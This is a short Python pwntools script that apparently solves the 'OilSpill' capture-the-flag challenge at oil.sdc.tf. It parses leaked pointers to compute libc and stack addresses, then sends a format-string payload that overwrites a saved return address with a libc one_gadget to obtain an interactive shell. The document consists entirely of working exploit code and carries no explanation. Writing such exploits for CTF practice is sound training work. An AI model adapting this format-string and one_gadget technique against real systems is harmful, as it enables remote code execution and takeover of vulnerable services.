#!/usr/bin/env python3

from pwn import *

exe = ELF("./OilSpill_patched")
libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("oil.sdc.tf", 1337)

    return r


def main():
    r = conn()
    if args.R2:
        input("wait")
    x = r.recvuntil(b"\n",drop=True).split(b", ")
    libc.address = int(x[0],16) - libc.sym["puts"]
    rip_address = int(x[2],16) + 0x148
    print("rip addr",hex(rip_address))
    print("libc base addr",hex(libc.address))
    one_gadget = libc.address+0x10a2fc
    print("one_gadget",hex(one_gadget))
    r.sendlineafter(b'clean it?\n',fmtstr_payload(8,{rip_address:one_gadget},write_size='short'))
    r.recvuntil(b"Proposition")
    r.interactive()


if __name__ == "__main__":
    main()
